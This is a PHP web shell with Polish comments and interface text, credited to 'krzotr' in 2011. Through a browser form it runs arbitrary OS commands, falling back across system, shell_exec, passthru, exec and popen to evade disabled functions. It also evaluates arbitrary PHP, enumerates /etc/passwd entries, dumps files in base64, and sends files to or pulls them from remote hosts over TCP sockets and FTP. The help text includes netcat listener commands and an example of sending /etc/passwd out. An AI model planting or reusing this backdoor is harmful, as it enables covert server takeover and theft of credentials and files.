<?php

require_once __DIR__ . '/Arr.php';
require_once __DIR__ . '/Request.php';
require_once __DIR__ . '/Form.php';
require_once __DIR__ . '/Html.php';

class Shell
{
	private $fGeneratedIn;
	private $bSafeMode;
	private $aDisableFunctions;
	private $bWindows;

	/**
	 * Komenda
	 */
	private $sCmd;

	/**
	 * Parametry
	 * @var type
	 */
	private $aArgv = array();

	/**
	 * Ilosc parametrow
	 *
	 * @var  integer
	 */
	private $iArgc = 0;

	/**
	 * Ciag parametrow
	 */
	private $sArg;


	private $bFuncOwnerById = FALSE;
	private $bFuncGroupById = FALSE;

	public function __construct()
	{
		Request::init();

		$this -> bWindows = ( strncmp( PHP_OS, 'WIN', 3 ) === 0 );

		/**
		 * SafeMode
		 */
		$this -> bSafeMode = (bool) ini_get( 'safe_mode' );

		$this -> bFuncOwnerById = function_exists( 'posix_getpwuid' );
		$this -> bFuncGroupById = function_exists( 'posix_getgrgid' );


		//error_reporting( 0 );
		if( ! $this -> bSafeMode )
		{
			ini_set( 'max_execution_time', 0);
			ini_set( 'memory_limit', '1024M' );
		//	ini_set( 'display_errors', 0 );
		}

		/**
		 * disable_functions
		 */
		if( ( $aDisableFunctions = explode( ',', ini_get( 'disable_functions' ) ) ) === '' )
		{
			$aDisableFunctions = FALSE;
		}
		else
		{
			array_walk( $aDisableFunctions, function( $sValue )
				{
					return strtolower( trim( $sValue ) );
				}
			);
		}

		$this -> aDisableFunctions = $aDisableFunctions;

		$this -> fGeneratedIn = microtime( 1 );
	}

	private function getOwnerById( $iValue )
	{
		if( $this -> bFuncOwnerById )
		{
			$aUser = posix_getpwuid( $iValue );
			return $aUser['name'];
		}

		return $iValue;
	}

	private function getGroupById( $iValue )
	{
		if( $this -> bFuncGroupById )
		{
			$aGroup = posix_getgrgid( $iValue );
			return $aGroup['name'];
		}

		return $iValue;
	}


	private function getHost( $sValue )
	{
		list( $sHost, $iPort ) = explode( ':', $sValue );

		return array( $sHost, (int) $iPort );
	}

	private function getStatus( $bValue, $bNegative = 0 )
	{
		return sprintf( '<span class="%s">%s</span>', ( ( $bNegative ? ! $bValue : $bValue ) ? 'green' : 'red' ), ( $bValue ? 'TAK' : 'NIE' ) );
	}

	private function getMenu()
	{
		return sprintf( 'Wersja PHP: <strong>%s</strong><br />' .
				'SafeMode: %s<br />' .
				'OpenBaseDir: %s<br />' .
				'Serwer Api: <strong>%s</strong><br />' .
				'Serwer: <strong>%s</strong><br />' .
				'Zablokowane funkcje: <strong>%s</strong><br />',

				phpversion(),
				$this -> getStatus( $this -> bSafeMode, 1 ),
				ini_get( 'open_basedir' ),
				php_sapi_name(),
				php_uname(),
				implode( ',', $this -> aDisableFunctions )
		);
	}

	private function getCommandEcho()
	{
		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
echo - Wyświetla tekst

	Użycie:
		echo [tekst do wyświetlenia]
HELP;
		}

		return htmlspecialchars( $this -> sArg );
	}


	private function getCommandGame()
	{
		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
game - Gra z komputerem

	Użycie:
		echo [cyfra z przedziału 0-9]

		echo [cyfra z przedziału 0-9] [ilość losowań]
HELP;
		}

		if( ( $this -> aArgv[0] !== 'x' ) && ( ! ctype_digit( $this -> aArgv[0] ) || strlen( $this -> aArgv[0] ) !== 1 ) )
		{
			return 'Komputera nie oszukasz, zapoznaj się z zasadami gry';
		}

		if( isset( $this -> aArgv[1] ) && ( ! ctype_digit( $this -> aArgv[1] ) || ( $this -> aArgv[1] > 1000 ) ) )
		{
			return 'Komputera nie oszukasz, zapoznaj się z zasadami gry';
		}

		$iLoop = ( isset( $this -> aArgv[1] ) ? (int) $this -> aArgv[1] : 1 );

		$sOutput = NULL;

		$iWins  = 0;
		$iLoses = 0;

		$iDigit = (int) $this -> aArgv[0];

		$i = 0;
		do
		{
			if( $this -> aArgv[0] === 'x' )
			{
				$iDigit = mt_rand( 0, 9 );
			}

			if( ( $iNum = mt_rand( 0, 9 ) ) === $iDigit )
			{
				$sOutput .= sprintf( "<span class=\"green\">Wygrałeś</span>   Twoja liczba: <strong>%d</strong>, liczba komputera: <strong>%d</strong>\n", $iDigit, $iNum );
				++$iWins;
			}
			else
			{
				$sOutput .= sprintf( "<span class=\"red\">Przegrałeś</span> Twoja liczba: <strong>%d</strong>, liczba komputera: <strong>%d</strong>\n", $iDigit, $iNum );
				++$iLoses;
			}
		}
		while( ++$i < $iLoop );

		return sprintf( "<span class=\"red\">Przegrałeś</span>: <strong>%d</strong>, <span class=\"green\">Wygrałeś</span>: <strong>%d</strong>, Success rata: <strong>%.2f</strong> %%\n\n%s", $iLoses, $iWins, ( $iWins / $this -> aArgv[1] ) * 100, $sOutput );
	}


	/**
	 * Eval
	 *
	 * @access private
	 * @return type string
	 */
	private function getCommandEval()
	{
		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
eval - Wykonanie kodu PHP

	Użycie:
		eval [skrypt php]

	Przykład:
		eval echo md5( 'test' );
HELP;
		}

		ob_start();
		eval( $this -> sArg );
		$sData = ob_get_contents();
		ob_clean();
		ob_end_flush();

		return htmlspecialchars( $sData );
	}

	/**
	 * SocketUpload
	 *
	 * @return type st
	 */
	public function getCommandSocketUpload()
	{
		if( ( $this -> iArgc !== 2 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
socketupload, socketup - Wysyłanie pliku za pomocą protokołu TCP

	Użycie:
		socketupload - host:port [ścieżka do pliku]

	Przykład:
		socketupload localhost:6666 /etc/passwd

	NetCat:
		nc -vv -l -p 6666
HELP;
		}

		$aHost = $this -> getHost( $this -> aArgv[0] );

		if( $aHost[1] === 0 )
		{
			return sprintf( 'Błędny host "%s"', $this -> aArgv[0] );
		}

		if( ! is_file( $this -> aArgv[1] ) )
		{
			return sprintf( 'Plik "%s" nie istnieje', $this -> aArgv[1] );
		}

		if( ( $rSock = fsockopen( $aHost[0], $aHost[1], $iErrorNo = NULL, $sErrorStr = NULL, 1 ) ) === FALSE )
		{
			return sprintf( 'Nie można połączyć się z serwerem "%s"', $this -> aArgv[0] );
		}

		if( ( $rFile = fopen( $this -> aArgv[1], 'r' ) ) === FALSE )
		{
			return sprintf( 'Nie można odczytać pliku "%s"', $this -> aArgv[1] );
		}

		while( ! feof( $rFile ) )
		{
			fwrite( $rSock, fread( $rFile, 131072 ) );
		}
		fclose( $rFile );
		fclose( $rSock );

		return 'Plik został przesłany';
	}



	public function getCommandSocketDownload()
	{
		if( ( $this -> iArgc !== 2 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
socketdownload, socketdown - Pobieranie pliku za pomocą protokołu TCP

	Użycie:
		socketupload - host:port [ścieżka do pliku gdzie ma być on zapisany]

	Przykład:
		socketupload localhost:6666 /tmp/plik.txt

	NetCat:
		nc -vv -w 1 -l -p 6666 < plik.txt
HELP;
		}

		$aHost = $this -> getHost( $this -> aArgv[0] );

		if( $aHost[1] === 0 )
		{
			return sprintf( 'Błędny host "%s"', $this -> aArgv[0] );
		}

		if( ( $rSock = fsockopen( $aHost[0], $aHost[1], $iErrorNo = NULL, $sErrorStr = NULL, 1 ) ) === FALSE )
		{
			return htmlspecialchars( sprintf( 'Nie można połączyć się z serwerem "%s"', $this -> aArgv[0] ) );
		}

		if( ( $rFile = fopen( $this -> aArgv[1], 'w' ) ) === FALSE )
		{
			return htmlspecialchars( sprintf( 'Nie można odczytać pliku "%s"', $this -> aArgv[1] ) );
		}

		while( ! feof( $rSock ) )
		{
			fwrite( $rFile, fread( $rSock, 131072 ) );
		}

		return htmlspecialchars( sprintf( 'Plik został pobrany i zapisany w "%s"', $this -> aArgv[1] ) );

		fclose( $rFile );
		fclose( $rSock );
	}




	public function getCommandFtpUpload()
	{
		if( ( $this -> iArgc !== 4 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
ftpupload, ftpup - Wysyłanie pliku na FTP

	Użycie:
		ftpupload - host:port login@hasło [plik źródłowy] [ścieżka docelowa]

	Przykład:
		ftpupload localhost:6666 test@test /home/usr/plik.txt /
HELP;
		}

		if( ! is_file( $this -> aArgv[2] ) )
		{
			return htmlspecialchars( sprintf( 'Plik "%s" nie istnieje', $this -> aArgv[2] ) );
		}

		$aHost = $this -> getHost( $this -> aArgv[0] );

		if( $aHost[1] === 0 )
		{
			$aHost[1] = 21;
		}

		list( $sUsername, $sPassword ) = explode( '@', $this -> aArgv[1] );


		if( ( $rFtp = ftp_connect( $aHost[0], $aHost[1], 5 ) ) === FALSE )
		{
			return htmlspecialchars( sprintf( 'Nie można połączyć się z serwerem FTP "%s"', $this -> aArgv[0] ) );
		}

		/**
		 * Autoryzacja
		 */
		if( ! ftp_login( $rFtp, $sUsername, $sPassword ) )
		{
			return htmlspecialchars( sprintf( 'Błędne dane do autoryzacji "%s"', $this -> aArgv[1] ) );
		}

		if( ! ftp_chdir( $rFtp, $this -> aArgv[3] ) )
		{
			return htmlspecialchars( sprintf( 'Na FTP nie istnieje katalog "%s"', $this -> aArgv[2] ) );
		}

		if( ! ftp_put( $rFtp, basename( $this -> aArgv[2] ), $this -> aArgv[2], FTP_BINARY ) )
		{
			return htmlspecialchars( sprintf( 'Nie można wgrać pliku "%s" na serwer', $this -> aArgv[2] ) );
		}

		ftp_close( $rFtp );

		return htmlspecialchars( sprintf( 'Plik "%s" został pomyślnie wgrany an FTP', $this -> aArgv[2] ) );
	}

	public function getCommandFtpDownload()
	{
		if( ( $this -> iArgc !== 4 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
ftpdownload, ftpdown - Pobieranie pliku z FTP

	Użycie:
		ftpdownload - host:port login@hasło [plik źródłowy] [plik docelowy]

	Przykład:
		ftpdownload localhost:6666 test@test /plik.txt /home/usr/plik.txt
HELP;
		}

		$aHost = $this -> getHost( $this -> aArgv[0] );

		if( $aHost[1] === 0 )
		{
			$aHost[1] = 21;
		}

		list( $sUsername, $sPassword ) = explode( '@', $this -> aArgv[1] );


		if( ( $rFtp = ftp_connect( $aHost[0], $aHost[1], 5 ) ) === FALSE )
		{
			return htmlspecialchars( sprintf( 'Nie można połączyć się z serwerem FTP "%s"', $this -> aArgv[0] ) );
		}

		/**
		 * Autoryzacja
		 */
		if( ! ftp_login( $rFtp, $sUsername, $sPassword ) )
		{
			return htmlspecialchars( sprintf( 'Błędne dane do autoryzacji "%s"', $this -> aArgv[1] ) );
		}

		if( ! ftp_chdir( $rFtp, ( $sDir = str_replace( '\\', '/', dirname( $this -> aArgv[2] ) ) ) ) )
		{
			return htmlspecialchars( sprintf( 'Na FTP nie istnieje katalog "%s"', $sDir ) );
		}

		if( ! ftp_get( $rFtp, $this -> aArgv[3], basename( $this -> aArgv[2] ), FTP_BINARY ) )
		{
			return htmlspecialchars( sprintf( 'Nie można pobrać pliku "%s" z serwera', $this -> aArgv[2] ) );
		}

		ftp_close( $rFtp );

		return htmlspecialchars( sprintf( 'Plik "%s" został pomyślnie pobrany an FTP i zapisany w "%s"', $this -> aArgv[2], $this -> aArgv[3] ) );
	}





	private function getCommandLs()
	{
		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
ls - Wyświetlanie informacji o plikach i katalogach

	Użycie:
		ls [ścieżka do katalogu]

	Opcje:
		-l  wyświetlanie szczegółowych informacji o plikach i katalogach
		    właściciel, grupa, rozmiar, czas utworzenia

		-R wyświetlanie plików i katalogów rekurencyjnie

	Przykład:
		ls /home/
		ls -l /home/
		ls -lR /home/
HELP;
		}

		$aOptions = array();
		if( isset( $this -> aArgv[0] ) && substr( $this -> aArgv[0], 0, 1 ) === '-' )
		{
			$aOptions = str_split( substr( $this -> aArgv[0], 1 ) );
			array_shift( $this -> aArgv );
		}

		$sDir = ( ! empty( $this -> aArgv[0] ) ? $this -> aArgv[0] : dirname( __FILE__ ) );

		$sOutput = NULL;


		$bList      = in_array( 'l', $aOptions );
		$bRecursive = in_array( 'R', $aOptions );

		try
		{
			if( $bRecursive )
			{
				$oDirectory = new RecursiveIteratorIterator( new RecursiveDirectoryIterator( $sDir ), RecursiveIteratorIterator::SELF_FIRST );
			}
			else
			{
				$oDirectory = new DirectoryIterator( $sDir );
			}

			$sOutput .= sprintf( "%s %s\n\n", $this -> sCmd, $this -> sArg );

			$sFileName = ( $bRecursive ? 'getPathname' : 'getBasename' );

			foreach( $oDirectory as $oFile )
			{
				if( $bList )
				{
					if( $this -> bWindows )
					{
						$sOutput .= sprintf( "%s %11d %s %s\n", ( ( $oFile -> getType() === 'file' ) ? '-' : 'd' ), $oFile -> getSize(), date( 'Y-m-d h:i', $oFile -> getCTime() ), $oFile -> {$sFileName}() );
					}
					else
					{
						$sOutput .= sprintf( "%s%s %-10s %-10s %11d %s %s\n", ( ( $oFile -> getType() === 'file' ) ? '-' : 'd' ), substr( sprintf( '%o', $oFile -> getPerms() ), -4 ), $this -> getOwnerById( $oFile -> getOwner() ), $this -> getGroupById( $oFile -> getGroup() ), $oFile -> getSize(), date( 'Y-m-d h:i', $oFile -> getCTime() ), $oFile -> {$sFileName}() );
					}
				}
				else
				{
					$sOutput .= sprintf( "%s %s\n", ( ( $oFile -> getType() === 'file' ) ? 'fil' : 'dir' ), $oFile -> {$sFileName}() );
				}
			}


			return htmlspecialchars( $sOutput );
		}
		catch( Exception $oException )
		{
			return sprintf( "Nie można otworzyć katalogu \"%s\"\n\nErro: %s", $sDir, $oException -> getMessage()  );
		}
	}


	private function getCommandBCat()
	{
		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
bcat, b64 - Wyświetlanie zawartości pliku przy użyciu base64

	Użycie:
		bcat [ścieżka do pliku]

	Przykład:
		bcat /etc/passwd
HELP;
		}

		if( ! is_file( $this -> aArgv[0] ) )
		{
			return sprintf( 'Plik "%s" nie istnieje', $this -> aArgv[0] );
		}

		$sMime = sprintf( "MIME-Version: 1.0\r\nContent-Type: application/octet-stream; name=\"%s\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"%s\"\r\n\r\n",
			basename( $this -> aArgv[0] ), basename( $this -> aArgv[0] )
		);
		return htmlspecialchars( $sMime . chunk_split( base64_encode( file_get_contents( $this -> aArgv[0] ) ), 130 ) );
	}

	private function getCommandCat()
	{
		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
cat - Wyświetlanie zawartości pliku

	Użycie:
		cat [ścieżka do pliku]

	Przykład:
		cat /etc/passwd
HELP;
		}

		if( ! is_file( $this -> aArgv[0] ) )
		{
			return sprintf( 'Plik "%s" nie istnieje', $this -> aArgv[0] );
		}

		return htmlspecialchars( file_get_contents( $this -> aArgv[0] ) );
	}


	private function getCommandDownload()
	{
		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
download, down - Pobieranie pliku

	Użycie:
		download [ścieżka do pliku]

	Opcje:
		-g pobieranie przy użyciu kompresji GZIP

	Przykład:
		download /etc/passwd
		download -g /etc/passwd
HELP;
		}

		$aOptions = array();
		if( isset( $this -> aArgv[0] ) && substr( $this -> aArgv[0], 0, 1 ) === '-' )
		{
			$aOptions = str_split( substr( $this -> aArgv[0], 1 ) );
			array_shift( $this -> aArgv );
		}

		$bGzip = in_array( 'g', $aOptions );

		if( ! is_file( $this -> aArgv[0] ) )
		{
			return sprintf( 'Plik "%s" nie istnieje', $this -> aArgv[0] );
		}

		if( $bGzip )
		{
			ini_set( 'zlib.output_compression', 9 );
		}

		ob_start();

		header( 'Cache-Control: must-revalidate, post-check=0, pre-check=0', TRUE );
		header( sprintf( 'Content-Disposition: attachment; filename="%s"', basename( $this -> aArgv[0] ) ), TRUE );
		header( 'Content-Type: application/octet-stream', TRUE );

		if( ( $rFile = fopen( $this -> aArgv[0], 'r' ) ) !== FALSE )
		{
			if( ! $bGzip )
			{
				header( sprintf( 'Content-Length: %s', filesize( $this -> aArgv[0] ) ), TRUE );
			}

			while( ! feof( $rFile ) )
			{
				echo fread( $rFile, 131072 );
				ob_flush();
				flush();
			}
		}
		ob_end_flush();
		exit ;
	}


	public function getCommandHelp()
	{
		$this -> aArgv[0] = 'help';
		$this -> iArgc    = 1;

		$oClass = new ReflectionClass( 'Shell' );
		$aMethods = $oClass -> getMethods();

		$aCommandsInfo = array();

		$sOutput = NULL;

		foreach( $aMethods as $oClass )
		{
			$sClass = $oClass -> getName();
			if( ( strncmp( $sClass, 'getCommand', 10 ) === 0 ) && ( $sClass !== 'getCommandHelp' ) )
			{
				$sInfo = $this -> {$sClass}() . "\n\n\n\n";
				$aCommandsInfo[] = substr( $sInfo, 0, strpos( $sInfo, "\n" ) );
				$sOutput .= $sInfo;

			}
		}

		$iDashPos = 0;
		$aCommands = array();
		foreach( $aCommandsInfo as $sCommand )
		{
			if( $iDashPos < ( $iDashNewPos = strpos( $sCommand, '-' ) ) )
			{
				$iDashPos = $iDashNewPos;
			}
			$aCommands[] = strlen( trim( substr( $sCommand, 0, $iDashNewPos - 1 ) ) );
		}

		foreach( $aCommandsInfo as $iKey => & $sCommand )
		{
			$sCommand = substr_replace( $sCommand, str_repeat( ' ', $iDashPos - $aCommands[ $iKey ] ), $aCommands[ $iKey ], 0 );
		}


		return implode( "\n", $aCommandsInfo ) . "\n\n\n\n" . $sOutput;
	}


	private function getCommandPhpinfo()
	{
		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
phpinfo - Informacje o PHP

	Użycie:
		phpinfo

HELP;
		}

		ob_start();
		phpinfo();
		$sData = ob_get_contents();
		ob_clean();
		ob_end_flush();

		/**
		 * Wywalanie zbednych tresci, klasy itp
		 * Licencje kazdy zna
		 */
		$sData = str_replace( array
			(
				' class="e"',
				' class="v"'
			),
			'',
			substr( $sData,
				strpos( $sData, '<div class="center">' ) + 20,
				-( strlen( $sData ) - strrpos( $sData, '<h2>PHP License</h2>' ) )
			)
		);

		/**
		 * logo kazdy widzial, creditsy tez
		 */
		$sData = preg_replace( '~<a href="http://www.php.net/"><img border="0" src="[^"]+" alt="PHP Logo" /></a><h1 class="p">(.+?)</h1>~', '<h1>$1</h1>', $sData );
		$sData = preg_replace( '~<a href=".+?"><img border="0" src=".+?" alt=".+?" /></a>~', NULL, $sData );
		$sData = preg_replace( '~<hr />\s+<h1><a href=".+?">PHP Credits</a></h1>~', NULL, $sData );


		return Html::shrink( $sData );
	}




	private function getCommandEtcPasswd()
	{
		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<HELP
etcpasswd - Próba pobrania struktury pliku /etc/passwd za pomocą funkcji posix_getpwuid

	Użycie:
		etcpasswd  (domyślnie z przedziały 0 do 65535)

		etcpasswd limit_dolny limit_górny

	Przykład:

		etcpasswd
		etcpasswd 1000 2000
HELP;
		}

		if( $this -> bWindows )
		{
			return 'Nie można uruchomić tego na windowsie';
		}

		if( $this -> bFuncOwnerById )
		{
			return 'Funkcja "posix_getpwuid" nie istnieje';
		}

		if( isset( $this -> aArgv[0] ) && ( ( $this -> aArgv[0] < 0 ) || ( $this -> aArgv[0] > 65534 ) ) )
		{
			return 'Błędny zakres dolny';
		}

		if( isset( $this -> aArgv[1] ) && ( ( $this -> aArgv[0] > $this -> aArgv[1] ) || ( $this -> aArgv[1] > 65534 ) ) )
		{
			return 'Błędny zakres górny';
		}

		$iMin = ( isset( $this -> aArgv[0] ) ? $this -> aArgv[0] : 0 );
		$iMax = ( isset( $this -> aArgv[1] ) ? $this -> aArgv[1] : 65535 );

		$sOutput = NULL;
		for( $i = $iMin; $i <= $iMax; $i++ )
		{
			if( ( $aUser = posix_getpwuid( $i ) ) !== FALSE)
			{
				$sOutput .= sprintf( "%s:%s:%d:%d:%s:%s:%s\n", $aUser['name'], $aUser['passwd'], $aUser['uid'], $aUser['gid'], $aUser['gecos'], $aUser['dir'], $aUser['shell'] );
			}
		}
		return $sOutput;
	}



	public function getActionBrowser()
	{
		$sConsole = NULL;
		$sCmd = NULL;

		$sContent = NULL;

		if( ! Request::isPost() )
		{
			$sCmd = ':ls -lR ' . dirname( __FILE__ );
		}
		else
		{
			$sCmd = (string) Request::getPost( 'cmd' );
		}

		if( substr( $sCmd, 0, 1 ) === ':' )
		{
			if( ( $iPos = strpos( $sCmd, ' ' ) - 1 ) !== -1 )
			{
				$this -> sCmd = substr( $sCmd, 1, $iPos );
			}
			else
			{
				$this -> sCmd = substr( $sCmd, 1 );
			}

			$this -> sArg = preg_replace( sprintf( '~^\:%s[\s+]?~', $this -> sCmd ), NULL, $sCmd );

			/**
			 * Rozdzielanie argumentow
			 */
			if( preg_match_all( '~\'(?:(?:\\\')|.*)\'|"(?:(?:\\")|(.*))"|[^ \r\n\t\'"]+~', $this -> sArg, $aMatch ) );
			{
				/**
				 * Usuwanie koncowych znakow " oraz ', zamienianie \" na " i \' na '
				 */
				array_walk( $aMatch[0], function( & $sVar )
					{
						$sVar = strtr( $sVar, array
							(
								'\\\'' => '\'',
								'\\"'  => '"'
							)
						);

						if(    ( ( substr( $sVar, 0, 1 ) === '"' ) && ( substr( $sVar, -1 ) === '"' ) )
						    || ( ( substr( $sVar, 0, 1 ) === '\'' ) && ( substr( $sVar, -1 ) === '\'' ) )
						)
						{
							$sVar = substr( $sVar, 1, -1 );
						}

					}
				);
				$this -> aArgv = $aMatch[0];
			}
			$this -> iArgc = count( $this -> aArgv );

			switch( $this -> sCmd )
			{
				case 'echo':
					$sConsole = $this -> getCommandEcho();
					break ;
				case 'eval':
					$sConsole = $this -> getCommandEval();
					break ;
				case 'etcpasswd':
					$sConsole = $this -> getCommandEtcPasswd();
					break;
				case 'socketupload':
				case 'socketup':
					$sConsole = $this -> getCommandSocketUpload();
					break ;
				case 'socketdownload':
				case 'socketdown':
					$sConsole = $this -> getCommandSocketDownload();
					break ;
				case 'ftpupload':
				case 'ftpup':
					$sConsole = $this -> getCommandFtpUpload();
					break ;
				case 'ftpdownload':
				case 'ftpdown':
					$sConsole = $this -> getCommandFtpDownload();
					break ;
				case 'ls':
					$sConsole = $this -> getCommandLs();
					break;
				case 'bcat':
				case 'b64':
					$sConsole = $this -> getCommandBCat();
					break ;
				case 'cat':
					$sConsole = $this -> getCommandCat();
					break;
				case 'download':
				case 'down':
					$sConsole = $this -> getCommandDownload();
					break;
				case 'game':
					$sConsole = $this -> getCommandGame();
					break;
				case 'help':
					$sConsole = $this -> getCommandHelp();
					break;
				case 'phpinfo':
					$sConsole = $this -> getCommandPhpInfo();
					break;
				default :
					$sConsole = sprintf( 'Nie ma takiej komendy "%s"', $this -> sCmd );
			}
		}
		else if( ! $this -> bSafeMode )
		{
			ob_start();
			if( ! in_array( 'system', $this -> aDisableFunctions ) )
			{
				system( $sCmd );
			}
			else if( ! in_array( 'shell_exec', $this -> aDisableFunctions ) )
			{
				echo shell_exec( $sCmd );
			}
			else if( ! in_array( 'passthru', $this -> aDisableFunctions ) )
			{
				passthru( $sCmd );
			}
			else if( ! in_array( 'exec', $this -> aDisableFunctions ) )
			{
				exec( $sCmd );
			}
			else if( ! in_array( 'popen', $this -> aDisableFunctions ) )
			{
				$rFp = popen( $sCmd, 'r' );
				while( ! feof( $rFp ) )
				{
					echo fread( $rFp, 1024 );
				}
			}
			else
			{
				echo 'Nic sobie nie porobisz, wszystkie funkcje systemowe poblokowane';
			}

			$sData = ob_get_contents();
			ob_clean();
			ob_end_flush();
			$sConsole = htmlspecialchars( $sData );
		}
		else
		{
			$sConsole = 'Safe mode jest włączone, więc exec, shell_exec, passthru, system i fopen nie zadziałają';
		}


		$sContent .= sprintf( '<pre id="console">%s</pre><br />', $sConsole );
		$sContent .= Form::open();
		$sContent .= Form::inputText( 'cmd', $sCmd, TRUE, array( 'size' => 110, 'id' => 'cmd' ) );
		$sContent .= Form::inputSubmit( 'submit', 'Send', array( 'id' => 'cmd-send' ) );
		$sContent .= Form::close();

		return $this -> getContent( $sContent );

	}


	private function getContent( $sData )
	{
		$sMenu = $this -> getMenu();
		$sGeneratedIn = sprintf( '%.5f', microtime( 1 ) - $this -> fGeneratedIn );
		$sTitle = sprintf( 'Shell @ %s (%s)', Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ) );
return <<<CONTENT
<!DOCTYPE HTML>
<html>
<head>
<title>{$sTitle}</title>
<meta charset="utf-8">
<style>
body{background-color:#eef7fb;color:#000;font-size:12px;font-family:sans-serif, Verdana, Tahoma, Arial;margin:10px;padding:0;}
a{color:#226c90;text-decoration:none;}
a:hover{color:#5a9cbb;text-decoration:underline;}
h1,h2,h3,h4,h5,h6{margin-top:10px;padding-bottom:5px;color:#054463;border-bottom:1px solid #d0d0d0;}
table{background-color:#fff;border:1px solid #e2ecf2;border-radius:20px;-moz-border-radius:20px;margin:auto;padding:6px;}
td{background-color:#f8f8f8;border-radius:5px;-moz-border-radius:5px;margin:0px;padding:0px;padding-left:4px}
th{color:#054463;font-size:14px;font-weight:bold;background-color:#f2f2f2;border-radius:5px;-moz-border-radius:5px;margin:0;padding:2px}
hr{margin-top:20px;background-color:#eef7fb;border:1px solid #eef7fb;}

div#body{text-align:center;border:3px solid #e2ecf2;border-radius:20px;-moz-border-radius:20px;min-width:950px;background-color:#fff;margin:0 auto;padding:20px;}
div#menu{margin:0 auto;text-align:left;}
div#bottom{margin:0 auto}
div#content{margin:0 auto;padding-top:10px}


pre#console{text-align:left;margin: 0 auto;height:400px;min-height:400px;width:98%;font-size:11px;background-color:#f9f9f9;color:#000;border:3px solid #e2ecf2;padding:8px;overflow:scroll}
input#cmd{width:95%;font-size:14px;margin-top:10px; padding: 4px;}
.green{color:#55b855;font-weight:bold}
.red{color:#fb5555;font-weight:bold}

</style>
</head>
<body>
</body>
<div id="body">
	<div id="menu">
		{$sMenu}
	</div>
	<div id="content">
		{$sData}
	</div>
	<div id="bottom">
		(C) 2011 by <strong>krzotr</strong>, Strona wygenerowana w: <strong>{$sGeneratedIn}</strong> s
	</div>
</div>
</html>
CONTENT;
	}

	public function get()
	{
		$sData = $this -> getActionBrowser();

		return $sData;

	}
}




/**
 * Wylaczanie wszystkich bufferow
 */
for( $i = 0; $i < ob_get_level(); $i++ )
{
	ob_clean();
	ob_end_flush();
}

ob_start();

$oShell = new Shell();
echo $oShell -> get();

if( ob_get_length() > 0 )
{
	ob_end_flush();
}

exit ;